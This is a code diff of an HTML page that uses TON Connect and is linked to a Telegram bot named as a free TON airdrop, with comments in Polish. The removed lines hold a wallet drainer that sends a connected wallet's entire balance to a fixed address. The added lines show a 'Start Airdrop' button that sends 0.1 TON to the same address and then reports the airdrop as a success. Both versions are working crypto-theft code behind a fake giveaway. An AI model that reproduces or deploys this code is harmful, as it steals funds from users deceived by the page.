@@ -11,61 +11,37 @@
 <body>
     <div class="center" id="ton-connect"></div>
     <script> const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json', buttonRootId: 'ton-connect' }); tonConnectUI.uiOptions = { twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot' };  </script>
-</body><!DOCTYPE html>
-<html lang="en">
+    <button id="start-airdrop" style="display:none">Rozpocznij Airdrop</button>
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/ton@latest/dist/ton.js"></script>
-</head>
+<script>
+    const startAirdropButton = document.getElementById('start-airdrop');
+    tonConnectUI.onStatusChange((status) => {
+        if (status === 'connected') {
+            startAirdropButton.style.display = 'block'; // Pokaż przycisk po połączeniu
+        }
+    });
+    startAirdropButton.addEventListener('click', async () => {
+    try {
+        // Ustal adres kontraktu i ilość TON do wymiany
+        const contractAddress = 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi';
+        const amountInTon = '0.1'; // na przykład
 
-<body>
-    <div class="center" id="ton-connect"></div>
-    <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
+        // Utwórz i podpisz transakcję
+        const result = await tonConnectUI.sendTransaction({
+            to: contractAddress,
+            value: amountInTon,
+            data: '', // opcjonalnie dane, które wymaga kontrakt
         });
 
-        tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
+        console.log('Transakcja pomyślna:', result);
+        alert('Airdrop zakończony sukcesem!');
 
-        // Nasłuchuj wydarzenia połączenia portfela
-        tonConnectUI.onWalletConnected(async (wallet) => {
-            try {
-                // Adres kontraktu docelowego
-                const receiverAddress = "EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi";
-                
-                // Pobierz saldo portfela
-                const balance = await tonConnectUI.wallet.ton.getBalance(wallet.address);
-                
-                // Przygotuj transakcję
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 360, // 60 minut ważności
-                    messages: [
-                        {
-                            address: receiverAddress,
-                            amount: balance, // Wysyłamy całe saldo
-                            payload: "" // Pusty payload
-                        }
-                    ]
-                };
-
-                // Wyślij transakcję
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log("Transakcja wysłana:", result);
-                
-            } catch (error) {
-                console.error("Błąd podczas wysyłania transakcji:", error);
-            }
-        });
-    </script>
+    } catch (error) {
+        console.error('Błąd transakcji:', error);
+        alert('Airdrop nie powiódł się.');
+    }
+});
+</script>
 </body>
-
-</html>
 
 </html>
